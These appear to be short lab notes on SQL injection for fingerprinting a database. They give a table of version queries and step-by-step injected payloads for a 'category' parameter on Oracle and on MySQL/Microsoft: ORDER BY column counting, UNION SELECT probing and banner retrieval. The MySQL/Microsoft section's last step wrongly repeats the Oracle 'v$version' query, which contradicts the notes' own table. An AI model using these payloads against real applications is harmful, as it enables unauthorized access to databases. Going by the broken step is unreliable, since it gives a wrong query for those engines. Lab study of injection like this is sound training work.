Examining the database in SQL injection attacks

# Examining the database in SQL injection attacks

| Database type | Query |
| ------------- | ------| 
|Microsoft 		|	SELECT @@version |
|Oracle 		|	SELECT * FROM v$version |
|PostgreSQL 	| 	SELECT version() |
|MySQL 			|	SELECT @@version |

## Lab - SQL injection attack, querying the database type and version on Oracle

Steps: 

1. Determine the number of column
```
category=Pets' ORDER BY 1,2 --
```

2. Determine data type for each column
```
category=Pets' UNION SELECT 'a','b' FROM DUAL --
```

3. Retrieve Oracle banner
```
category=Pets' UNION SELECT banner, null FROM v$version --
```
```
UNION SELECT * FROM v$version where banner LIKE 'oracle%'--

```

## SQL injection attack, querying the database type and version on MySQL and Microsoft


Steps

1. Determine the number of column
```
category=Pets' ORDER BY 1,2 #
```

2. Determine data type for each column
```
category=Pets' UNION SELECT 'a','b' #
```

3. Retrieve Oracle banner
```
category=Pets' UNION SELECT banner, null FROM v$version --
```

`#` = %23